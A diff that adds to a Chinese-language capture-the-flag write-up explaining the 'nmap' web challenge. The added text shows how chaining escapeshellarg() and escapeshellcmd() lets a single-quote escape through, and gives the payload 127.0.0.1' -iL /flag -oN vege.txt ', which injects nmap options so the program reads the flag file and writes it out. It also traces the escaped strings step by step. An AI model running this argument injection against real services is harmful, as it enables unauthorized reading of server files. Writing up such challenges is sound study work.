@@ -180,9 +180,28 @@ flag为flag{afa41fc8-574f-1248-1a84-9d7f7120f89c}
 
 ## web 0x1 nmap
 
+[escapeshellarg()+escapeshellcmd()](https://paper.seebug.org/164/)
+
 127.0.0.1' -iL /flag -oN vege.txt '
 
 `nmap 127.0.0.1' -iL /flag -oN vege.txt '`
+
+单引号逃逸，源代码中
+
+```php
+$host=escapeshellarg($host);   //"'127.0.0.1'\''-iL../../../../flag -o 1'"
+$host=escapeshellcmd($host);   //"'127.0.0.1'\\''-il../../../../flag -o 1\'"
+```
+
+    
+    "nmap '127.0.0.1'\\'' -iL /flag -o 1\'"
+    去掉配对的单引号
+    "nmap 127.0.0.1 -iL /flag -o 1'"
+    输出到 1' 这个文件中
+
+如果没带单引号就会解释为一个字符串，逃逸不了
+    
+    "nmap '127.0.0.1 -iL /flag -o 1'"
 
 ## web 0x2 phpweb
 
